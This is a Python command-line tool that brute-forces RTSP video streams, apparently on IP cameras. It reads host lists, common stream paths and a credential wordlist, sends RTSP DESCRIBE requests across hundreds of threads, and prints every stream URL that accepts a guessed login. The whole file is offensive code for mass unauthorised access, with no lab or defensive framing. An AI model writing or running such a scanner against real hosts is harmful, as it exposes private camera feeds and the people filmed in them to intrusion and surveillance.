#!/usr/bin/env python
import socket as so
from fire import Fire
from concurrent.futures import ThreadPoolExecutor as TPE
from functools import partial


def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 2):
    if cred:
        cred += '@'
    req = (
        f'DESCRIBE rtsp://{cred}{host}:{port}{path} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        'Accept: application/sdp\r\n'
        'User-Agent: Mozilla/5.0\r\n\r\n'
    )
    with so.socket() as s:
        s.settimeout(timeout)
        s.connect((host, port))
        s.send(req.encode())
        return s.recv(1024)


def check_cred(host, port, path, cred):
    data = rtsp_req(host, port, path, cred).decode()
    if any(map(lambda code: f' {str(code)} ' in data, [401, 503])):
        # print('[-]', host, path, data)
        print('-', end='', flush=True)
        return

    if ' 200 ' in data:
        # print('✪', host, path, cred, data)
        print('+', end='', flush=True)
        return f'rtsp://{cred}@{host}:{port}{path}'


def check_path(host, port, path):
    with open('./data/rtsp_creds.txt') as f:
        creds = [ln.rstrip() for ln in f]
    ch = partial(check_cred, host, port, path)

    try:
        data = rtsp_req(host, port, path)
        # if '\x15\x00\x00\x00\x02\x02' in repr(data):
        #     return
        text = data.decode()
        if any(map(lambda code: f' {str(code)} ' in text, [404, 400, 403, 451, 503, 415])):
            return []

        with TPE(2) as ex:
            results = []
            for res in ex.map(ch, creds):
                if res:
                    results.append(res)
            return results

    except so.timeout as e:
        # print(host, 'timeout')
        return []
    except KeyboardInterrupt:
        print('Iterrupted by user')
        exit(130)
    except Exception as e:
        # print(host, e)
        return []


def check_host(host):
    ch = partial(check_path, host, 554)

    with TPE(4) as ex:
        with open('./data/rtsp_paths.txt') as f:
            paths = [ln.rstrip() for ln in f]

        results = []
        for res in ex.map(ch, paths):
            for rr in res:
                if rr:
                    if 'FAKE' in rr:
                        return
                    results.append(rr)

        # print(results)
        return results


def main():
    with open('./local/hosts_554.txt') as f:
        hosts = [ln.rstrip() for ln in f]

    with TPE(256) as ex:
        for res in ex.map(check_host, hosts):
            if res:
                print(res[0][res[0].index('@')+1:res[0].index('/')])
                for url in res:
                    print(url)


if __name__ == "__main__":
    Fire(main)
